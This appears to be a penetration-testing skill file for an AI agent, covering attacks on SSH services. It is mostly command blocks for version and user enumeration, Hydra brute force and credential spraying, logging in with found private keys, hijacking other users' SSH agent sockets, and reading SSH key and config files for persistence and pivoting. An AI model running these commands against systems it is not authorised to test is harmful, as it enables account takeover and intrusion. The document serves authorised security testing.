---
name: svc-ssh
description: SSH attack techniques — version CVEs, auth-method/user enumeration, key issues, targeted brute. Use when SSH is open. Triggers - port 22, OpenSSH banner, regreSSHion CVE-2024-6387, user-enum CVE-2018-15473, authorized_keys, weak/leaked key.
---

# SSH Attack Reference

## Version-Specific CVEs
- **OpenSSH <7.7** (CVE-2018-15473): Username enumeration via timing
- **OpenSSH 8.5-9.7** (CVE-2024-6387 / regreSSHion): Race condition → unauthenticated RCE (glibc-based Linux)
- **OpenSSH <6.6**: Various auth bypass and info disclosure

## Enumeration
```bash
# Banner grab
nc -nv <target> 22
nmap -sV -p 22 <target>

# Username enumeration (CVE-2018-15473)
ssh-audit <target>
# Or use msf: auxiliary/scanner/ssh/ssh_enumusers

# Auth methods
ssh -o PreferredAuthentications=none -o PubkeyAuthentication=no <target> 2>&1
nmap --script ssh-auth-methods -p 22 <target>
```

## Credential Attacks
```bash
# Hydra brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4 -f

# Common credentials
hydra -L users.txt -p admin ssh://<target> -t 4
hydra -l root -p toor ssh://<target>

# Spray found credentials
crackmapexec ssh <target> -u users.txt -p passwords.txt --no-bruteforce
```

## Key-Based Attacks
```bash
# Check for weak/default keys
nmap --script ssh-hostkey --script-args ssh_hostkey=full -p 22 <target>

# If you find private keys
chmod 600 found_key
ssh -i found_key <user>@<target>

# SSH agent forwarding hijack (if you have user access)
# Look for SSH_AUTH_SOCK in other users' environments
find /tmp -name "agent.*" 2>/dev/null
```

## Post-Auth
```bash
# Check authorized_keys for persistence
cat ~/.ssh/authorized_keys
# SSH config for pivot targets
cat ~/.ssh/config
cat ~/.ssh/known_hosts
```
